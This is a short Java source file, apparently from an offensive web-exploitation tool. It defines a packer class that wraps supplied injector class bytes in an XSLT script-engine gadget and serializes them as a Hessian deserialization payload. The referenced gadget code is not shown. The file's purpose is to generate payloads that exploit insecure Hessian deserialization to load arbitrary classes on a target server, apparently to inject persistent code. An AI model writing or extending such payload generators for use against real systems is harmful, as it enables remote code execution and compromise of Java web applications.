package com.reajason.javaweb.packer.deserialize.hessian;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.deserialize.HessianDeserializeGenerator;
import org.kohsuke.MetaInfServices;


/**
 * @author ReaJason
 * @since 2025/2/20
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.HessianXSLTScriptEngine, parent = Packers.HessianDeserialize, requiresClasses = {"com.caucho.hessian.io.Hessian2Output"}, order = 2410)
public class HessianXSLTScriptEnginePacker implements Packer {
    @Override
    public String pack(ClassPackerConfig config) {
        byte[] injectorBytes = config.getClassBytes();
        String injectorClassName = config.getClassName();
        return HessianDeserializeGenerator.generate(XSLTScriptEngine.generate(injectorBytes, injectorClassName));
    }
}
